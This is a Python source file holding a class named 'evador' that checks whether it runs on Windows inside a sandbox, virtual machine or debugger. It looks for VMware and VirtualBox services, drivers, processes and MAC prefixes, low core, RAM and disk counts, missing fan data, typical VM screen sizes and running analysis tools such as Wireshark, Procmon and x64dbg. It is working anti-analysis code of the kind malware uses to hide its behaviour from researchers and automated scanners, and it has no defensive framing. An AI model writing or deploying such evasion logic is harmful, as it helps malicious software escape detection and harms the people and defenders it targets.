import os
import psutil
import shutil
import pyautogui
import multiprocessing
from ctypes import windll
from utilities import utility
from getmac import get_mac_address as gma

class evador:
    util = utility()
    
    def __init__(self):
        (output, return_code) = self.util.run_powershell_command("tasklist")
        self.running_processes = output.lower()     #Get running processes
    
    def evade_detection(self):
        """Are we running on some test environment
        Testing hardware components, OS type..."""
        
        if not self.is_windows():
            return False
        elif self.is_on_sandbox():
            return False
        elif self.is_on_vm():
            return False
        elif self.hardware_tests():
            return False
        elif self.is_on_debug():
            return False
                      
        return True

    def is_on_safe_mode(self):
        """Are we running on safe mode"""

        (output, return_code) = self.util.run_powershell_command("(gwmi win32_computersystem -Property BootupState).BootupState")
        return "normal" not in output.lower()       #If normal in the current bootstate then we are not in safe mode
    
    def is_windows(self):
        """Is the current OS windows?"""   
        return os.name == "nt"

    def hardware_tests(self):
        """Hardware checks such as: cpu cores amount, memory amount..."""
        
        try:
            actuall_size = ""
            hdd = shutil.disk_usage(__file__)
            size = psutil._common.bytes2human(psutil.virtual_memory().total)
            (output, return_code) = self.util.run_powershell_command("Get-WmiObject -Class Win32_Fan")
            
            for i in size:
                if str(i).isdigit() or i == '.':
                    actuall_size += str(i)
            
            if return_code != 0:
                return True
            if multiprocessing.cpu_count() == None or multiprocessing.cpu_count() <= 2:     #How many cores does the CPU have
                return True
            elif int(hdd.total / (2**30)) <= 100:    #If total size is less then 100
                return True
            elif float(actuall_size) <= 4:      #RAM
                return True
            elif output == None or len(output) == 0 or "ObjectNotFound" in output or return_code != 0:      #Data about the CPU fans, VM doesn't have which means when executed returns blank
                return True
            
            return False
        except Exception as e:
            print(e)
            return False

    def is_on_vm(self):
        """Are we running on VM?"""
        
        try:
            (output, return_code) = self.util.run_powershell_command("get-service")
            known_services = ['VMTools', 'Vmhgfs', 'VMMEMCTL', 'Vmmouse', 'Vmrawdsk', 'Vmusbmouse', 'Vmvss', 'Vmscsi', 'Vmxnet', 'vmx_svga', 'Vmware Tools', 'Vmware Physical Disk Helper Service']
            
            output = output.lower()
            if return_code != 0:
                return True
            
            for service in known_services:
                if service.lower() in output:
                    return True
            
            known_files = ['C:\\windows\\System32\\Drivers\\Vmmouse.sys', 'C:\\windows\\System32\\Drivers\\vm3dgl.dll', 'C:\\windows\\System32\\Drivers\\vmdum.dll', 'C:\\windows\\System32\\Drivers\\vm3dver.dll', 'C:\\windows\\System32\\Drivers\\vmtray.dll', 'C:\\windows\\System32\\Drivers\\VMToolsHook.dll', 'C:\\windows\\System32\\Drivers\\vmmousever.dll', 'C:\\windows\\System32\\Drivers\\vmhgfs.dll', 'C:\\windows\\System32\\Drivers\\vmGuestLib.dll', 'C:\\windows\\System32\\Drivers\\VmGuestLibJava.dll', 'C:\\windows\\System32\\Driversvmhgfs.dll', 'C:\\windows\\System32\\Drivers\\VBoxMouse.sys', 'C:\\windows\\System32\\Drivers\\VBoxGuest.sys', 'C:\\windows\\System32\\Drivers\\VBoxSF.sys', 'C:\\windows\\System32\\Drivers\\VBoxVideo.sys', 'C:\\windows\\System32\\vboxdisp.dll', 'C:\\windows\\System32\\vboxhook.dll', 'C:\\windows\\System32\\vboxmrxnp.dll', 'C:\\windows\\System32\\vboxogl.dll', 'C:\\windows\\System32\\vboxoglarrayspu.dll', 'C:\\windows\\System32\\vboxoglcrutil.dll', 'C:\\windows\\System32\\vboxoglerrorspu.dll', 'C:\\windows\\System32\\vboxoglfeedbackspu.dll', 'C:\\windows\\System32\\vboxoglpackspu.dll', 'C:\\windows\\System32\\vboxoglpassthroughspu.dll', 'C:\\windows\\System32\\vboxservice.exe', 'C:\\windows\\System32\\vboxtray.exe', 'C:\\windows\\System32\\VBoxControl.exe']
            for file in known_files:
                if os.path.exists(file) and os.path.isfile(file):
                    return True
            
            known_processes = ['vmtoolsd.exe', 'vmwaretrat.exe', 'vmwareuser.exe', 'vmacthlp.exe', 'vboxservice.exe', 'vboxtray.exe', 'vbox.exe']
            for process in known_processes:
                if process.lower() in self.running_processes:
                    return True
            
            known_mac_addresses = ['00:05:69', '00:0C:29', '00:1C:14', '00:50:56', '08:00:27']
            for address in known_mac_addresses:
                if address in str(gma()):
                    return True
            
            width, height = pyautogui.size()        #Checking for screen size
            if (width == 800 and height == 600) or (width == 1024 and height == 768):
                return True
            
            return False
        except Exception as e:
            print(e)
            return False

    def is_on_debug(self):
        """Is there a debugger"""
        
        try:
            return windll.kernel32.IsDebuggerPresent() != 0
        except Exception as e:
            print(e)
            return False
    
    def is_on_sandbox(self):
        """Are we running on sandbox"""
        
        try:
            known_processes = ['Wireshark.exe', 'Fiddler.exe', 'Procmon64.exe', 'Procmon.exe', 'Procexp.exe', 'Procexp64.exe', 'Sysmon64.exe', 'Sysmon.exe', 'ProcessHacker.exe', 'OllyDbg.exe', 'ImmunityDebugger.exe', 'x64dbg.exe', 'x32dbg.exe', 'Windbgx64.exe', 'Windbgx86.exe']
            for process in known_processes:
                if process.lower() in self.running_processes:
                    return True
            
            return False
        except Exception as e:
            print(e)
            return False